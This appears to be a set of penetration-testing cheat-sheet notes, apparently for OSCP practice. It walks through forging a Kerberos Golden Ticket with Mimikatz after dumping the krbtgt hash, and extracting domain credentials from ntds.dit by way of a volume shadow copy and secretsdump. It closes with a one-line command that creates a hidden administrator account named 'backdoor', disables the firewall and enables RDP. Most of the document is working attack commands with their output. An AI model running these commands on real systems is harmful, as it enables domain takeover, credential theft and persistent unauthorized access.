#### Golden Ticket
Requisites:
1. Domain SID
2. krbtgt ntlm hash
3. an existent user account
4. Domain name

First, connect to a DC and run lsadump::lsa /patch to extract only ntlms including krbtgt.
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CORP / S-1-5-21-1987370270-658905905-1781884369

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
...
```
Create a golden ticket with mimikatz and inject it in the current logon session:

Note: Remember to clean previous tickets before inject the golden ticket. 

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
User      : jen
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500    
Groups Id : *513 512 520 518 519
ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # misc::cmd
```




#### Shadow Copies

This creates an entire copy of the c:\ drive and put it in a share.
We can extract the NTDS.dit database from the shadow copy using secretsdump.py.
We'll only need the HKLM/System key to be able to decrypt the ntds.dit.

```
C:\Tools>vshadow.exe -nw -p  C:

VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.


(Option: No-writers option detected)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000010
Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set succesfully created.

List of created shadow copies:


Querying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...

* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
   - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
   - Original count of shadow copies = 1
   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
   - Creation Time: 9/19/2022 4:31:51 AM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  Auto_Release No_Writers Differential


Snapshot creation done.
```

```
C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
   1 file(s) copied.
```
As a last ingredient, to correctly extract the content of **ntds.dit**, we need to save the SYSTEM hive from the Windows registry. We can accomplish this with the **reg** utility and the **save** argument.

```
C:\>reg.exe save hklm\system c:\system.bak
The operation completed successfully.
```
Once the two **.bak** files are moved to our Kali machine, we can continue extracting the credential materials with the _secretsdump_ tool from the impacket suite. We'll supply the ntds database and the system hive via **-ntds** and **-system**, respectively along with the **LOCAL** keyword to parse the files locally.

```
kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```






# Enabling RDP in one line CMD

This is very helpful during OSCP.

Change Username and Password.

### SIMPLER:
```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f

netsh advfirewall set allprofiles state off

```

## CMD

net user /add backdoor Backdoor123!! && net localgroup administrators backdoor /add & net localgroup "Remote Desktop Users" backdoor /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v backdoor /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto



```
xfreerdp /v:10.10.10.100 +clipboard /u:backdoor /p:Password123!! /cert-ignore /tls-seclevel:0   
```
### [](https://github.com/crazywifi/Enable-RDP-One-Liner-CMD#explain)

### Explain

Adding User: net user /add (Username) (Password)

#### [](https://github.com/crazywifi/Enable-RDP-One-Liner-CMD#adding-user-in-administrator-group)

#### Adding User in Administrator Group:

net localgroup administrators (Username) /add

#### [](https://github.com/crazywifi/Enable-RDP-One-Liner-CMD#adding-user-in-remote-desktop-users)

#### Adding user in Remote Desktop Users:

net localgroup "Remote Desktop Users" (Username) /add

#### [](https://github.com/crazywifi/Enable-RDP-One-Liner-CMD#opening-port-in-local-firewall)

#### Opening Port in Local Firewall:

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

#### [](https://github.com/crazywifi/Enable-RDP-One-Liner-CMD#hiding-user-from-window-login-screen)

#### Hiding User from Window Login Screen:

reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v (Username) /t REG_DWORD /d 0

#### [](https://github.com/crazywifi/Enable-RDP-One-Liner-CMD#setting-terminal-service-in-startup-mode)

#### Setting Terminal Service in Startup Mode:

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f

#### [](https://github.com/crazywifi/Enable-RDP-One-Liner-CMD#setting-terminal-service-in-auto-mode)

#### Setting Terminal Service in Auto Mode:

sc config TermService start= auto